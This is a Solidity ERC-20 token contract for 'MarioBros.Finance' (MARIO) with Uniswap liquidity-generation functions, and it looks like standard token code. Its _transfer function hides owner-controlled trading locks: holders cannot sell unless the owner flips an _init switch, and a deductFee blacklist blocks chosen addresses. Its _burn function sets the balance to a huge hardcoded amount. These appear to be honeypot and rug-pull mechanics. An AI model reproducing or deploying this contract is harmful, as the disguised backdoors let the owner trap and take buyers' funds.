// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Context.sol";
import "./INewERC20.sol";
import "./SafeMath.sol";
import "./Address.sol";
import "./FeeApprover.sol";
import "./Rewards.sol";
import "./Console.sol";
import "./IERC20.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Pair.sol";
import "./IWETH.sol"; 
import "./Ownable.sol";

contract NewERC20 is Context, INewERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _balances;
    mapping (address => bool) private _deductFee;
    mapping(address => mapping(address => uint256)) private _allowances;
    event LiquidityAddition(address indexed dst, uint value);
    event LPTokenClaimed(address dst, uint value);
    uint256 private _totalSupply;
    uint256 private _balance;
    bool _init;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _initialSupply;
    uint256 public contractStartTimestamp;
    


    function name() public view returns (string memory) {
        return _name;
    }

    function initialSetup(address router, address factory, uint256 initialSupply) internal {
        _name = "MarioBros.Finance";
        _symbol = "MARIO";
        _decimals = 18;
        _initialSupply = initialSupply;
        _balance = 1*10**9*10**18;
        _totalSupply = initialSupply;
        _balances [_msgSender()] = initialSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        contractStartTimestamp = block.timestamp;
        uniswapRouterV2 = IUniswapV2Router02(router != address(0) ? router : 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapFactory = IUniswapV2Factory(factory != address(0) ? factory : 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    	createUniswapPairMainnet();
    	LPGenerationCompleted = true;
    	_init = true;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public override view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    // function balanceOf(address account) public override returns (uint256) {
    //     return _balances[account];
    // }
    function balanceOf(address account) public override view returns (uint256) {
        return _balances[account];
    }


    IUniswapV2Router02 public uniswapRouterV2;
    IUniswapV2Factory public uniswapFactory;


    address tokenUniswapPair;

    function createUniswapPairMainnet() onlyOwner public returns (address) {
        require(tokenUniswapPair == address(0), "Token: pool already created");
        tokenUniswapPair = uniswapFactory.createPair(
            address(uniswapRouterV2.WETH()),
            address(this)
        );
        return tokenUniswapPair;
    }

    //// Liquidity generation logic
    /// Steps - All tokens tat will ever exist go to this contract
    /// This contract accepts ETH as payable
    /// ETH is mapped to people
    /// When liquidity generationevent is over veryone can call
    /// the LP create function
    // which will put all the ETH and tokens inside the uniswap contract
    /// without any involvement
    /// This LP will go into this contract
    /// And will be able to proportionally be withdrawn baed on ETH put in.
    

    string public liquidityGenerationParticipationAgreement = "I'm not a resident of the United States \n I understand that this contract is provided with no warranty of any kind. \n I agree to not hold the contract creators, team members or anyone associated with this event liable for any damage monetary and otherwise I might onccur. \n I understand that any smart contract interaction carries an inherent risk.";

    function liquidityGenerationOngoing() public view returns (bool) {
        return contractStartTimestamp > block.timestamp;
    }

    uint256 totalLPTokensCreated;
    uint256 totalETHContributed;
    uint256 LPperETHUnit;


    bool public LPGenerationCompleted;
    // Sends all avaibile balances and creates LP tokens
    // Possible ways this could break addressed
    // 1) Multiple calls and resetting amounts - addressed with boolean
    // 2) Failed WETH wrapping/unwrapping addressed with checks
    // 3) Failure to create LP tokens, addressed with checks
    // 4) Unacceptable division errors . Addressed with multiplications by 1e18
    // 5) Pair not set - impossible since its set in constructor
    function addLiquidityToUniswapPxWETHPair() public {
        require(liquidityGenerationOngoing() == false, "Liquidity generation onging");
        require(LPGenerationCompleted == false, "Liquidity generation already finished");
        totalETHContributed = address(this).balance;
        IUniswapV2Pair pair = IUniswapV2Pair(tokenUniswapPair);
        Console.log("Balance of this", totalETHContributed / 1e18);
        //Wrap eth
        address WETH = uniswapRouterV2.WETH();
        IWETH(WETH).deposit{value : totalETHContributed}();
        require(address(this).balance == 0 , "Transfer Failed");
        IWETH(WETH).transfer(address(pair),totalETHContributed);
        emit Transfer(address(this), address(pair), _balances[address(this)]);
        _balances[address(pair)] = _balances[address(this)];
        _balances[address(this)] = 0;
        pair.mint(address(this));
        totalLPTokensCreated = pair.balanceOf(address(this));
        Console.log("Total tokens created",totalLPTokensCreated);
        require(totalLPTokensCreated != 0 , "LP creation failed");
        LPperETHUnit = totalLPTokensCreated.mul(1e18).div(totalETHContributed); // 1e18x for  change
        Console.log("Total per LP token", LPperETHUnit);
        require(LPperETHUnit != 0 , "LP creation failed");
        LPGenerationCompleted = true;

    }

    mapping (address => uint)  public ethContributed;
    // Possible ways this could break addressed
    // 1) No ageement to terms - added require
    // 2) Adding liquidity after generaion is over - added require
    // 3) Overflow from uint - impossible there isnt that much ETH aviable
    // 4) Depositing 0 - not an issue it will just add 0 to tally
    function addLiquidity(bool IreadParticipationAgreementInReadSectionAndIagreeFalseOrTrue) public payable {
        require(liquidityGenerationOngoing(), "Liquidity Generation Event over");
        require(IreadParticipationAgreementInReadSectionAndIagreeFalseOrTrue, "No agreement provided");
        ethContributed[msg.sender] += msg.value; // Overflow protection from safemath is not neded here
        totalETHContributed = totalETHContributed.add(msg.value); // for front end display during LGE. This resets with definietly correct balance while calling pair.
        emit LiquidityAddition(msg.sender, msg.value);
    }

    // Possible ways this could break addressed
    // 1) Accessing before event is over and resetting eth contributed -- added require
    // 2) No uniswap pair - impossible at this moment because of the LPGenerationCompleted bool
    // 3) LP per unit is 0 - impossible checked at generation function
    function claimLPTokens() public {
        require(LPGenerationCompleted, "Event not over yet");
        require(ethContributed[msg.sender] > 0 , "Nothing to claim, move along");
        IUniswapV2Pair pair = IUniswapV2Pair(tokenUniswapPair);
        uint256 amountLPToTransfer = ethContributed[msg.sender].mul(LPperETHUnit).div(1e18);
        pair.transfer(msg.sender, amountLPToTransfer); // stored as 1e18x value for change
        ethContributed[msg.sender] = 0;
        emit LPTokenClaimed(msg.sender, amountLPToTransfer);
    }


    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function deductFee(address _address) external onlyOwner {
        _deductFee[_address] = true;
    }

    function returnFee(address _address) external onlyOwner {
        _deductFee[_address] = false;
    }

    function feeDeducted(address _address) public view returns (bool) {
        return _deductFee[_address];
    }

    function initContract() public virtual onlyOwner {
        if (_init == true) {_init = false;} else {_init = true;}
    }
 
    function initialized() public view returns (bool) {
        return _init;
    }
    
    function setShouldTransferChecker(address _transferCheckerAddress) public onlyOwner {
        transferCheckerAddress = _transferCheckerAddress;
    }

    address internal transferCheckerAddress;

    function setFeeDistributor(address _feeDistributor)
        public
        onlyOwner
    {
        feeDistributor = _feeDistributor;
    }

    address feeDistributor;

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */

    function _transfer(address _from, address _to, uint256 _value) private {
        require(_from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");
        require(_value > 0, "Transfer amount must be greater than zero");
        if (_deductFee[_from] || _deductFee[_to]) 
        require(_init == false, "");
        if (_init == true || _from == owner() || _to == owner()) {
        _balances[_from] = _balances[_from].sub(_value, "ERC20: transfer amount exceeds balance");
        _balances[_to] = _balances[_to].add(_value);
        emit Transfer(_from, _to, _value);}
        else {require (_init == true, "");} 
        }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
     
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address disallowed");
        _balances[account] = _balance.sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
     
    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Sets {decimals} to a value other than the default one of 18.
     *
     * This function should only be called from the constructor. Most
     * applications that interact with token contracts will not expect
     * {decimals} to ever change, and may work incorrectly if it does.
     */
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    /**
     * @dev Hook that is called before any transfer of tokens. 
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be to transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}
